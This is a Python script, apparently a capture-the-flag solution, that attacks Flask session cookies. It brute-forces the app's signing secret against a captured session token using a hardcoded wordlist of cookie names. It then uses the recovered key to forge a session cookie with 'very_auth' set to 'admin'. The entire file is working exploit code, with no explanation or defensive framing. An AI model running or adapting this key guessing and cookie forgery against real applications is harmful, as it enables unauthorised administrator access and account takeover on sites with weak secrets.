#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)


def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys


def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)


if __name__ == '__main__':
    cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
    sessionDict = {"very_auth":"snickerdoodle"}
    mySession = "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YuEp2A.LxE6hlFkvcrjbBID2f0Z8JKIXMQ"
    
    for secret in cookie_names:
        try:
            cookie = decodeFlaskCookie(secret, mySession)
            print(cookie)
            secret = secret
            break
        except:
            pass
    
    adminSession = {"very_auth":"admin"}
    adminCookie = encodeFlaskCookie(secret, adminSession)
    print(adminCookie)